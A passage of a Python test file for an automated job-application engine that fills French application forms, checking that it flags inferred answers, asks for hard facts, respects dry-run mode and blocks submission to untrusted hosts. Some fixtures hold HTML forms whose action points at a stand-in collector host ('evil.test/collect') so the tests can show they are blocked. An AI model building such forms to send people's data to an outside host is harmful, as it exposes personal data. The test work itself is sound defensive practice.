async def test_label_re_looks_at_the_visible_label_first(page, server, fast, cv_pdf, tmp_path):
    facts = extra_facts(first_name={"label_re": "pr[eé]nom|first.?name|given"})
    await serve(page, "tricky", '<form><label for=a>Ville *</label><input id=a name="first_name" placeholder="Prénom"><button>Envoyer ma candidature</button></form>')
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^Ville", "fill", "first_name"), act(snap, r"Envoyer", "click", role="submit")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="tricky", facts=facts)
    assert await page.input_value("#a") == "" and "sans rapport" in res.steps[0].note
    await serve(page, "nolabel", '<form><input id=a name="first_name" placeholder="Prénom"><button>Envoyer ma candidature</button></form>')
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"Pr", "fill", "first_name"), act(snap, r"Envoyer", "click", role="submit")])  # noqa: E731
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="nolabel", facts=facts)
    assert await page.input_value("#a") == "Camille"   # no label at all: name + placeholder decide


async def test_preselected_required_choice_is_a_question_unless_it_is_a_dial_code(page, server, fast, cv_pdf, tmp_path):
    plan = deduce_plan()
    res = await go(page, server, ScriptedPlanner([lambda s: StepPlan(page_kind="form", actions=[
        act(s, r"^Prénom", "fill", "first_name"), act(s, r"Envoyer", "click", role="submit")])]), tmp_path, cv_pdf, start="preselected_country")
    assert res.status == "needs_input" and [q.label for q in res.questions] == ["Pays de nationalité"]  # +33 by group; nationality asked
    del plan


async def test_plausible_deduction_is_filled_logged_as_inferred_and_hard_facts_are_asked(page, server, fast, cv_pdf, tmp_path):
    v = FakeVerifier(lambda i: "plausible")
    plan = deduce_plan(lambda s: eng_choice(s), lambda s: inferred(act(s, r"Date de naissance", "fill", None, "01/01/2000"), "né en 2000"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", verifier=v)
    assert await page.input_value("#eng") == "a" and await page.input_value("#bd") == ""   # the birth date is a hard fact
    filled = {f.label: f for f in res.steps[0].filled}
    assert filled["Niveau d'anglais"].inferred and filled["Niveau d'anglais"].basis == "niveau B2 en anglais"
    assert filled["Niveau d'anglais"].value == "I can manage" and not filled["Prénom"].inferred and filled["Prénom"].basis == ""
    assert res.status == "needs_input" and {q.label for q in res.questions} == {"Date de naissance", "Adresse postale", "Nationalité"}
    item = next(i for c in v.calls for i in c)
    assert item.inferred and item.basis == "niveau B2 en anglais" and item.fact_label == "" and item.kind == "select"
    assert "date du jour" not in str(v.facts)  # (the catalogue is whatever the sheet holds)


async def test_deduction_not_flagged_by_the_planner_but_judged_plausible_gets_a_basis_from_the_cited_fact(page, server, fast, cv_pdf, tmp_path):
    plan = deduce_plan(lambda s: eng_choice(s, fact="work_auth", flag=False))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=extra_facts(), verifier=FakeVerifier(lambda i: "plausible"))
    f = next(f for f in res.steps[0].filled if f.label == "Niveau d'anglais")
    assert f.inferred and f.basis == "déduit du fait « Autorisation de travail »" and await page.input_value("#eng") == "a"


@pytest.mark.parametrize("verdict", ["contradiction", "hard_fact", False, ""])
async def test_contradiction_hard_fact_or_missing_verdict_is_dropped_and_asked(page, server, fast, cv_pdf, tmp_path, verdict):
    class V(FakeVerifier):
        async def check(self, items, facts=None):
            return {} if verdict == "" else {i.ref: verdict for i in items}
    plan = deduce_plan(lambda s: eng_choice(s))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", verifier=V())
    assert await page.input_value("#eng") == "" and "Niveau d'anglais" in {q.label for q in res.questions}
    assert "non étayée" in res.steps[0].note


async def test_hard_fact_label_never_takes_an_inferred_action_even_when_the_verifier_says_plausible(page, server, fast, cv_pdf, tmp_path):
    plan = deduce_plan(lambda s: inferred(act(s, r"Adresse postale", "fill", None, "1 rue de la Paix"), "habite Toulouse"),
                       lambda s: inferred(act(s, r"Nationalité", "select", None, "Française"), "né en France"),
                       lambda s: act(s, r"Adresse postale", "fill", "company", "ACME").model_copy(update={"ref": act(s, r"Date de naissance", "fill").ref}))
    v = FakeVerifier(lambda i: "plausible")
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", verifier=v)
    assert await page.input_value("#ad") == "" and await page.input_value("#nt") == "" and await page.input_value("#bd") == ""
    assert {"Adresse postale", "Nationalité", "Date de naissance"} <= {q.label for q in res.questions}
    assert all(i.question != "Adresse postale" for c in v.calls for i in c)  # never even sent for an inferred hard fact


async def test_hard_fact_answer_citing_a_known_fact_is_accepted_only_when_supported(page, server, fast, cv_pdf, tmp_path):
    facts = extra_facts()
    facts.facts.append(Fact(key="address", label="Adresse", value="12 rue des Lilas, Toulouse"))
    plan = deduce_plan(lambda s: act(s, r"Adresse postale", "fill", "address", "12 rue des Lilas, Toulouse"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=FakeVerifier(lambda i: "supported"))
    assert await page.input_value("#ad") == "12 rue des Lilas, Toulouse"
    # "plausible" is not enough on a hard fact when code cannot back the value
    plan = deduce_plan(lambda s: act(s, r"Adresse postale", "fill", "address", "12 rue des Lilas"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#ad") == "" and "Adresse postale" in {q.label for q in res.questions}


async def test_optional_field_with_an_inferred_action_is_dropped_silently(page, server, fast, cv_pdf, tmp_path):
    v = FakeVerifier(lambda i: "plausible")
    plan = deduce_plan(lambda s: inferred(act(s, r"travaillé en équipe", "select", None, "Oui"), "projets d'équipe"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", verifier=v)
    assert await page.input_value("#team") == "" and "facultatif" in res.steps[0].note
    assert "Avez-vous déjà travaillé en équipe ?" not in {q.label for q in res.questions} and not any(
        "équipe" in i.question for c in v.calls for i in c)


async def test_verifier_down_fact_backed_answers_pass_and_deductions_pause(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[
            act(snap, r"^Ville", "fill", "city", "Toulouse"),                       # equals the fact
            act(snap, r"Mois de début", "fill", "available_from", "09/2026"),      # strict date re-formatting
            act(snap, r"Disponible à partir", "fill", "available_from", "01/09/2026"),   # invented day
            act(snap, r"autorisé", "select", "work_auth", "Oui"),                  # needs the verifier
            act(snap, r"Années d'expérience", "fill", None, "3").model_copy(update={"inferred": True, "basis": "alternances"}),
            act(snap, r"Envoyer", "click", role="submit")])
    for verifier in (None, FakeVerifier(error=RuntimeError("llm down"))):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=verifier)
        assert await page.input_value("#fn") == "Toulouse" and await page.input_value("#av2") == "09/2026", verifier
        assert await page.input_value("#av") == "" and await page.input_value("#q") == "" and await page.input_value("#exp") == ""
        assert {"Disponible à partir de", "Années d'expérience"} <= {q.label for q in res.questions}
        assert [f.inferred for f in res.steps[0].filled] == [False, False]
    # a choice whose option equals the fact value is backed by code too
    def sit(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Situation", "select", "situation", "Alternance")])
    await go(page, server, ScriptedPlanner([sit, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="form", verifier=None, max_steps=2)
    assert await page.input_value("#sit") == "alt"


async def test_boolean_verdicts_of_an_old_verifier_are_still_read(page, server, fast, cv_pdf, tmp_path):
    plan = lambda s: StepPlan(page_kind="form", actions=[act(s, r"autorisé", "select", "work_auth", "Oui"), act(s, r"Envoyer", "click", role="submit")])  # noqa: E731
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=FakeVerifier(lambda i: True))
    assert await page.input_value("#q") == "o"
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=FakeVerifier(lambda i: False))
    assert await page.input_value("#q") == ""

    class Old:   # check(items) only, no facts argument
        async def check(self, items):
            return {i.ref: True for i in items}
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=Old())
    assert await page.input_value("#q") == "o"


# ------------------------------------------------------------------ 7. bookkeeping token
async def test_the_token_is_stripped_from_planner_notes_and_labels(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", note="ok SUBMIT_Clicked et submit_clicked", actions=[act(snap, r"^Prénom", "fill", "first_name")])
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="email_verification", note="lien Submit_Clicked")]), tmp_path, cv_pdf,
                   start="form", mode="submit", max_steps=2)
    blob = json.dumps(res.model_dump(mode="json"), ensure_ascii=False).lower().replace('"submit_clicked": ', "")
    assert "submit_clicked" not in blob and "ok  et" in res.steps[0].note


# ------------------------------------------------------------------ 8. things seen on real sites
async def test_the_exact_tagged_element_is_clicked_even_when_a_hidden_clone_carries_the_same_ref(page, server, fast, cv_pdf, tmp_path):
    def open_(snap):
        return StepPlan(page_kind="job_page", actions=[act(snap, r"Postulez", "click", role="open_form")])
    res = await go(page, server, ScriptedPlanner([open_, form_plan("submit")]), tmp_path, cv_pdf, start="dup_apply")
    assert res.steps[0].clicked == "Postulez maintenant" and "clic annulé" not in res.steps[0].note
    assert res.final_url.endswith("/form") and res.status == "ready"


async def test_dry_run_enters_nothing_on_account_pages(page, server, fast, cv_pdf, tmp_path):
    def signup(snap):
        return StepPlan(page_kind="account_signup", actions=[act(snap, r"e-mail", "fill", "account_email"),
                                                             act(snap, r"^Mot de passe", "fill", "account_password"),
                                                             act(snap, r"Créer mon compte", "click", role="signup")])
    res = await go(page, server, ScriptedPlanner([signup]), tmp_path, cv_pdf, start="signup")
    assert res.status == "ready" and "compte" in res.message and await page.input_value("#ae") == "" and not server.sent
    assert all(s.filled == [] for s in res.steps)
    login = lambda snap: StepPlan(page_kind="account_login", actions=[act(snap, r"e-mail", "fill", "account_email")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([login]), tmp_path, cv_pdf, start="login_get")
    assert res.status == "ready" and await page.input_value("#ae") == ""


async def test_ad_page_with_empty_search_and_login_boxes_keeps_its_open_form_click(page, server, fast, cv_pdf, tmp_path):
    def open_(snap):
        return StepPlan(page_kind="job_page", actions=[act(snap, r"Je postule", "click", role="open_form")])
    res = await go(page, server, ScriptedPlanner([open_, form_plan("submit")]), tmp_path, cv_pdf, start="ad_boxes")
    assert res.steps[0].clicked == "Je postule à cette offre" and res.final_url.endswith("/form") and res.status == "ready"


async def test_long_cookie_banner_label_naming_cookies_is_clicked_before_data(page, server, fast, cv_pdf, tmp_path):
    def cookie(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Decline all", "click", role="cookies")])
    def fill(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Envoyer ma", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([cookie, fill]), tmp_path, cv_pdf, start="cookies_long")
    assert res.steps[0].clicked == "Decline all non-necessary cookies" and await page.locator("#banner").count() == 0
    assert res.status == "ready" and not server.sent


async def test_upload_gets_its_own_step_then_the_page_is_read_again(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    """Real-site case: the ATS re-renders the form after parsing the CV, so fills planned on the old snapshot would be stale."""
    from jobhunt.apply import engine

    monkeypatch.setattr(engine, "SPLIT_UPLOADS", True)
    planner = ScriptedPlanner([job_plan, form_plan("submit"), form_plan("submit")])
    res = await go(page, server, planner, tmp_path, cv_pdf)
    assert res.status == "ready" and not apply_posts(server)
    assert [s.page_kind for s in res.steps] == ["job_page", "form", "form"]
    assert [f.op for f in res.steps[1].filled] == ["upload_cv"] and "relecture" in res.steps[1].note
    assert {f.fact for f in res.steps[2].filled} >= {"first_name", "email", "phone"}
    assert await page.evaluate("document.getElementById('cv').files[0].name") == cv_pdf.name and await page.input_value("#fn") == "Camille"


# ================================================================== third review round
PREFILLED_FORMS = {
    "input_value": '<form method="post" action="/apply"><label for=a>Prénom</label><input id=a name=first_name value="Camille">'
                   '<button type="submit">Continuer</button></form>',
    "textarea": '<form method="post" action="/apply"><label for=a>Message</label><textarea id=a name=msg>Bonjour</textarea>'
                '<input type="submit" value="Continuer"></form>',
    "button_outside_form": '<form id="f" method="post" action="/apply"><label for=a>Prénom</label><input id=a name=first_name value="Camille"></form>'
                           '<button form="f">Continuer</button>',
    "untyped_button": '<form method="post" action="/apply"><label for=a>E-mail</label><input id=a type=email name=email value="c@example.test">'
                      '<button>Continuer</button></form>',
}


def open_continuer(snap):
    return StepPlan(page_kind="job_page", actions=[act(snap, r"Continuer", "click", role="open_form")])


@pytest.mark.parametrize("name", sorted(PREFILLED_FORMS))
async def test_dry_run_never_clicks_the_submit_of_a_prefilled_form_whatever_the_planner_calls_it(page, server, fast, cv_pdf, tmp_path, name):
    await serve(page, "prefilled", PREFILLED_FORMS[name])
    res = await go(page, server, ScriptedPlanner([open_continuer]), tmp_path, cv_pdf, start="prefilled")
    assert res.status == "ready" and not server.posts and not server.sent and res.steps[-1].clicked == "" and not res.submit_clicked
    assert "déjà rempli" in res.message


async def test_dry_run_still_clicks_when_the_form_holds_no_data(page, server, fast, cv_pdf, tmp_path):
    # hidden fields, an empty text box: nothing of the candidate's in the form -> an apply button inside it may be clicked
    await serve(page, "emptyform", '<form method="get" action="/form"><input type=hidden name=t value=x><input name=q aria-label="Recherche">'
                                   '<button type="submit">Postuler</button></form>')
    plan = lambda snap: StepPlan(page_kind="job_page", actions=[act(snap, r"Postuler", "click", role="open_form")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="emptyform", max_steps=3)
    assert res.steps[0].clicked == "Postuler"
    # ... but a pre-filled page refuses every control, a plain type=button included (the page may submit by script)
    await serve(page, "plainbtn", '<form method="post" action="/apply"><input name=first_name value="Camille" aria-label="Prénom">'
                                  '<button type="button" onclick="document.title=\'clic\'">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="plainbtn", max_steps=3)
    assert res.status == "ready" and res.steps[0].clicked == "" and not server.posts


async def test_dry_run_keeps_the_request_guard_when_a_page_cannot_be_sent_to_about_blank(page, server, fast, cv_pdf, tmp_path, release):
    async def failing(*a, **k):
        raise RuntimeError("goto down")

    def sabotage(snap):
        page.goto = failing  # type: ignore[method-assign]
        return form_plan("submit")(snap)
    try:
        res = await go(page, server, ScriptedPlanner([job_plan, sabotage]), tmp_path, cv_pdf)
    finally:
        page.__dict__.pop("goto", None)
    assert res.status == "ready"
    # the guard is still installed: a document request of the page is aborted (data was entered in this run)
    with pytest.raises(Exception):
        await page.goto(server.url("continuer"))
    assert not server.posts


# ------------------------------------------------------------------ 2. unanswered questions before any final / post-data click
PARTIAL_FORM = ('<form method="post" action="/apply"><label for=a>Prénom *</label><input id=a name=first_name required>'
                '<label for=b>Nom *</label><input id=b name=last_name required><button type="submit">Continuer</button></form>')


@pytest.mark.parametrize("role", ["open_form", "next"])
async def test_required_questions_are_checked_before_a_post_data_click_whatever_the_planner_calls_it(page, server, fast, cv_pdf, tmp_path, role):
    await serve(page, "partial", PARTIAL_FORM)
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"),  # noqa: E731
                                                            act(snap, r"Continuer", "click", role=role)])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="partial", mode="submit")
    assert res.status == "needs_input" and [q.label for q in res.questions] == ["Nom"]
    assert not server.posts and not res.submit_clicked and res.steps[-1].clicked == ""


# ------------------------------------------------------------------ 3. the send policy gates the first field interaction of a step
async def test_before_submit_runs_once_per_step_before_any_field_is_touched(page, server, fast, cv_pdf, tmp_path):
    seen = []

    async def gate():
        seen.append((await page.input_value("#fn"), await page.is_checked("input[name=rgpd]")))
        return []
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit", before_submit=gate)
    assert res.status == "submitted" and seen == [("", False)]


async def test_before_submit_refusal_blocks_before_anything_is_entered(page, server, fast, cv_pdf, tmp_path):
    calls = []

    async def gate():
        calls.append(1)
        return ["déjà postulé"]
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, mode="submit", before_submit=gate)
    assert res.status == "blocked" and "déjà postulé" in res.message and calls == [1]
    assert await page.input_value("#fn") == "" and not await page.is_checked("input[name=rgpd]") and not server.sent
    assert not res.submit_clicked and not res.steps[-1].filled


# ------------------------------------------------------------------ 4. destination: the form the button OWNS
async def test_button_owned_by_another_form_is_checked_against_that_forms_action(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "owner", '<form id=a method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                               '<button type="submit" form="b">Envoyer ma candidature</button></form>'
                               '<form id=b method="post" action="https://evil.test/collect"></form>')
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    for mode in ("dry_run", "submit"):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="owner", mode=mode, host_allowed=lambda h: h == "exemple.test")
        assert res.status == "blocked" and res.untrusted_host == "evil.test" and not res.submit_clicked
        assert await page.input_value("#fn") == "" and not server.sent


async def test_unreadable_form_destination_fails_closed(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "badaction", '<form method="post" action="http://[bad/"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                                   '<button type="submit">Envoyer ma candidature</button></form>')
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="badaction", mode="submit")
    assert res.status == "blocked" and "destination du formulaire illisible" in res.message and await page.input_value("#fn") == ""
    # a click-only step (no field to fill) is checked too
    await serve(page, "badclick", '<form method="post" action="http://[bad/"><input name=first_name value="x" aria-label="Prénom">'
                                  '<button type="submit">Envoyer ma candidature</button></form>')
    res = await go(page, server, ScriptedPlanner([lambda s: StepPlan(page_kind="form", actions=[act(s, r"Envoyer", "click", role="submit")])]),
                   tmp_path, cv_pdf, start="badclick", mode="submit", max_steps=3)
    assert res.status != "submitted" and not server.sent


# ------------------------------------------------------------------ 5. hard-fact fields: name / placeholder count
async def test_hard_fact_is_recognised_from_the_name_or_placeholder_of_an_unhelpful_label(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "dobpage", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                                 '<label for=a>Votre réponse *</label><input id=a name="dob">'
                                 '<label for=b>Autre *</label><input id=b name=x placeholder="Code postal">'
                                 '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"Votre réponse", "fill", None, "01/01/2000"), "né en 2000"),
                       lambda s: inferred(act(s, r"Autre", "fill", None, "31000"), "habite Toulouse"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="dobpage", verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#a") == "" and await page.input_value("#b") == ""
    assert res.status == "needs_input" and {q.label for q in res.questions} == {"Votre réponse", "Autre"}


# ------------------------------------------------------------------ 6. the inferred flag follows what code can back
def filled_of(res, label):
    return next(f for f in res.steps[0].filled if f.label == label)


async def test_supported_by_the_verifier_but_not_by_code_is_still_reported_as_inferred(page, server, fast, cv_pdf, tmp_path):
    ok = FakeVerifier(lambda i: "supported")
    # planner flagged it: its own basis is kept
    plan = deduce_plan(lambda s: eng_choice(s, fact="work_auth", flag=True))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=extra_facts(), verifier=ok)
    f = filled_of(res, "Niveau d'anglais")
    assert await page.input_value("#eng") == "a" and f.inferred and f.basis == "niveau B2 en anglais"
    # not flagged by the planner: a basis is made from the cited fact
    plan = deduce_plan(lambda s: eng_choice(s, fact="work_auth", flag=False))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=extra_facts(), verifier=ok)
    f = filled_of(res, "Niveau d'anglais")
    assert f.inferred and f.basis == "déduit du fait « Autorisation de travail »"
    # plausible: same
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=extra_facts(), verifier=FakeVerifier(lambda i: "plausible"))
    assert filled_of(res, "Niveau d'anglais").inferred


async def test_inferred_stays_false_only_when_code_establishes_the_answer_or_a_custom_answer_is_confirmed(page, server, fast, cv_pdf, tmp_path):
    ok = FakeVerifier(lambda i: "supported")
    # option label equal to the fact value: code backs it, even when the planner flagged it
    facts = extra_facts()
    facts.facts.append(Fact(key="english", label="Anglais", value="I can manage"))
    plan = deduce_plan(lambda s: inferred(act(s, r"Niveau d'anglais", "select", "english", "I can manage"), "B2", "english"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=ok)
    assert not filled_of(res, "Niveau d'anglais").inferred and not filled_of(res, "Prénom").inferred
    # the candidate's own custom answer, confirmed by the verifier
    facts = extra_facts()
    facts.facts.append(Fact(key="custom_7", label="Niveau d'anglais", value="B2"))
    plan = deduce_plan(lambda s: act(s, r"Niveau d'anglais", "select", "custom_7", "I can manage"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=ok)
    assert not filled_of(res, "Niveau d'anglais").inferred
    # ... but a custom answer the verifier only finds plausible is reported
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=FakeVerifier(lambda i: "plausible"))
    assert filled_of(res, "Niveau d'anglais").inferred


async def test_an_answer_citing_a_known_fact_may_fill_an_optional_field_and_is_reported_when_code_cannot_back_it(page, server, fast, cv_pdf, tmp_path):
    facts = extra_facts()
    facts.facts.append(Fact(key="team", label="Travail en équipe", value="Projets d'équipe en BTS"))
    plan = deduce_plan(lambda s: inferred(act(s, r"travaillé en équipe", "select", "team", "Oui"), "projets d'équipe", "team"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=FakeVerifier(lambda i: "supported"))
    f = next(x for x in res.steps[0].filled if "équipe" in x.label)
    assert await page.input_value("#team") == "o" and f.inferred and f.basis == "projets d'équipe"
    # ... and still never without a fact
    plan = deduce_plan(lambda s: inferred(act(s, r"travaillé en équipe", "select", None, "Oui"), "projets d'équipe"))
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="deduce", facts=facts, verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#team") == ""


# ------------------------------------------------------------------ 7. the right document, the right consent
FILE_FORM = ('<form method="post" action="/apply" enctype="multipart/form-data"><label for=d>{label}</label>'
             '<input type=file id=d name=d required><button type="submit">Envoyer ma candidature</button></form>')


@pytest.mark.parametrize("label", ["Copie du diplôme *", "Relevé de notes *", "Pièce d'identité *", "Photo *", "Attestation de stage *"])
async def test_a_lone_file_input_naming_another_document_is_not_taken_for_the_cv(page, server, fast, cv_pdf, tmp_path, label):
    await serve(page, "docs", FILE_FORM.format(label=label))
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r".", "upload_cv", kind="file"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="docs", verifier=None)
    assert res.status == "needs_input" and await page.evaluate("document.getElementById('d').files.length") == 0
    v = FakeVerifier(lambda i: "contradiction")
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="docs", verifier=v)
    assert [i.kind for c in v.calls for i in c] == ["upload_cv"] and await page.evaluate("document.getElementById('d').files.length") == 0


async def test_a_lone_neutral_file_input_or_a_cv_labelled_one_is_accepted_by_code(page, server, fast, cv_pdf, tmp_path):
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r".", "upload_cv", kind="file"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    for label in ("Mon dossier *", "Votre CV *"):
        await serve(page, "docs", FILE_FORM.format(label=label))
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="docs", verifier=None)
        assert res.status == "ready" and await page.evaluate("document.getElementById('d').files.length") == 1
        assert not res.steps[0].filled[0].inferred


CONSENT_FORM = ('<form method="post" action="/apply"><fieldset><legend>Données personnelles</legend>'
                '<label><input type=checkbox name=c required> {label} *</label></fieldset>'
                '<button type="submit">Envoyer ma candidature</button></form>')


async def test_only_privacy_consents_are_ticked_by_code(page, server, fast, cv_pdf, tmp_path):
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"accept", "check", "consent_required"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    await serve(page, "consent", CONSENT_FORM.format(label="J'accepte les conditions de l'offre salariale"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="consent", verifier=None)
    assert res.status == "needs_input" and not await page.is_checked("input[name=c]")   # (its group says "Données personnelles": not enough)
    v = FakeVerifier(lambda i: "supported")
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="consent", verifier=v)
    assert len(v.calls) == 1 and await page.is_checked("input[name=c]") and res.steps[0].filled[0].inferred
    for label in ("J'accepte la politique de confidentialité", "J’accepte les conditions générales d’utilisation",
                  "J'accepte le traitement de mes données personnelles", "I accept the privacy policy"):
        await serve(page, "consent", CONSENT_FORM.format(label=label))
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="consent", verifier=None)
        assert res.status == "ready" and await page.is_checked("input[name=c]") and not res.steps[0].filled[0].inferred, label


# ------------------------------------------------------------------ 8. a recorded navigation click stays "possibly sent" until a form is seen again
async def test_failure_after_a_recorded_nav_click_keeps_the_submit_clicked_flag(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    real = engine.take_snapshot
    calls = []

    async def flaky(p):
        calls.append(1)
        if len(calls) >= 2:   # every snapshot after the first (the page left by the click) fails
            raise RuntimeError("page gone")
        return await real(p)
    monkeypatch.setattr(engine, "take_snapshot", flaky)
    navs = []

    async def nav():
        navs.append(1)
    res = await go(page, server, ScriptedPlanner([step1, step2()]), tmp_path, cv_pdf, start="step1", mode="submit", on_nav_click=nav)
    assert navs == [1] and res.status == "failed" and res.submit_clicked and not apply_posts(server)


async def test_flow_that_continues_clears_the_flag_and_a_later_failure_is_not_a_send(page, server, fast, cv_pdf, tmp_path):
    def boom(snap):
        raise RuntimeError("planner down")
    res = await go(page, server, ScriptedPlanner([step1, boom]), tmp_path, cv_pdf, start="step1", mode="submit", on_nav_click=no_reasons)
    assert any("step2" in s.url for s in res.steps) and res.status == "failed" and not res.submit_clicked and not apply_posts(server)


# ================================================================== fourth review round
# ------------------------------------------------------------------ 1. a pre-filled application is "post-data" in SUBMIT mode too
SAVED_DRAFT = ('<form method="post" action="{action}"><label for=a>E-mail</label><input id=a type=email name=email value="camille@example.test">'
               '{extra}<button type="submit">Continuer</button></form>')


def click_only(role):
    return lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"Continuer", "click", role=role)])


@pytest.mark.parametrize("role", ["next", "open_form", "submit"])
async def test_saved_draft_click_gets_the_destination_check_even_when_the_step_filled_nothing(page, server, fast, cv_pdf, tmp_path, role):
    await serve(page, "draft", SAVED_DRAFT.format(action="https://evil.test/collect", extra=""))
    res = await go(page, server, ScriptedPlanner([click_only(role)]), tmp_path, cv_pdf, start="draft", mode="submit",
                   host_allowed=lambda h: h == "exemple.test", max_steps=3)
    assert res.status == "blocked" and res.untrusted_host == "evil.test" and not server.sent and res.steps[-1].clicked == ""


@pytest.mark.parametrize("role", ["next", "open_form"])
async def test_saved_draft_click_is_gated_and_recorded_whoever_filled_the_form(page, server, fast, cv_pdf, tmp_path, role):
    await serve(page, "draft", SAVED_DRAFT.format(action="/apply", extra=""))
    gates, navs, finals = [], [], []

    async def gate():
        gates.append(len(server.sent))
        return []

    async def nav():
        navs.append(len(server.sent))

    async def final():
        finals.append(1)
    res = await go(page, server, ScriptedPlanner([click_only(role), StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="draft",
                   mode="submit", before_submit=gate, on_nav_click=nav, on_submit_click=final, max_steps=3)
    assert gates == [0] and len(navs) + len(finals) == 1 and len(apply_posts(server)) == 1 and res.submit_clicked

    async def refuse():
        return ["déjà postulé"]
    server.posts.clear(); server.sent.clear()
    res = await go(page, server, ScriptedPlanner([click_only(role)]), tmp_path, cv_pdf, start="draft", mode="submit", before_submit=refuse, max_steps=3)
    assert res.status == "blocked" and not server.sent and not res.submit_clicked


async def test_saved_draft_with_an_unanswered_required_field_is_a_question_whatever_the_role(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "draft", SAVED_DRAFT.format(action="/apply", extra='<label for=n>Nom *</label><input id=n name=last_name required>'))
    res = await go(page, server, ScriptedPlanner([click_only("open_form")]), tmp_path, cv_pdf, start="draft", mode="submit", max_steps=3)
    assert res.status == "needs_input" and [q.label for q in res.questions] == ["Nom"] and not server.sent, res.message


# ------------------------------------------------------------------ 2. one logical click = one dispatch
class FakeEl:
    """An element whose click raises AFTER having dispatched (navigation, detach, timeout after dispatch)."""
